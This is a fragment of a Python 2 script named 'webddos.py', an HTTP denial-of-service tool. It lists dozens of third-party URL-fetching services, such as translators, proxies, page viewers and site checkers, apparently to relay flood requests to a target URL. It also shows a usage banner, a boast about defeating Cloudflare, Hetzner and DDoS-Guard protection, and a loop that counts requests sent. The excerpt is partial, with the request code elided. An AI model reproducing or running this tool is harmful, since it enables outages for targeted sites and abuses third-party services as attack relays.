...
def bots():
	...
	bots=[]
        ...
        bots.append("https://unmask.sucuri.net/security-report/?page=")
        bots.append("http://www.hamann-russia.ru/open.php?url=")
        bots.append("http://www.webeyn.com/git.php?url=")
        bots.append("https://www.websiteplanet.com/webtools/down-or-not/?DorN=")
        bots.append("http://drive.google.com/viewerng/viewer?url=")
        bots.append("http://www.textise.net/showText.aspx?strURL=")
        bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
        bots.append("http://developers.google.com/speed/pagespeed/insights/?url=")
        bots.append("http://www.textise.net/showText.aspx?strURL=")
        bots.append("http://ww3.myonlinestats.com/go/go.php?url=")
        bots.append("http://transparencyreport.google.com/safe-browsing/search?url=")
        bots.append("http://quirktools.com/screenfly/#u=")
        bots.append("http://colorfilter.wickline.org/?a=1;r=uitest.com;l=0;j=1;u=")
        bots.append("http://de.hideproxy.me/go.php?u=")
        bots.append("http://www.haberoku.com/iframe.php?url=")
        bots.append("http://www.cheapassgamer.com/redirect.php?url=")
        bots.append("http://tools.pingdom.com/")
        bots.append("http://www.alexa.com/siteinfo/")
	...
	bots.append("https://ceviri.yandex.com.tr/translate?url=")
...
def usage():
	print '---------------------------------------------------'
	print 'USAGE: python webddos.py <url>'
	print 'you can add "safe" after url, to autoshut after dos'
	print '---------------------------------------------------'
print \
"""                                                                                                                                          
FUCKED CF-Hetzner-DDG etc  
"""
print '---------------------------------------------------'
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Sendeds Request" % (request_counter)
				previous=request_counter
		if flag==2:
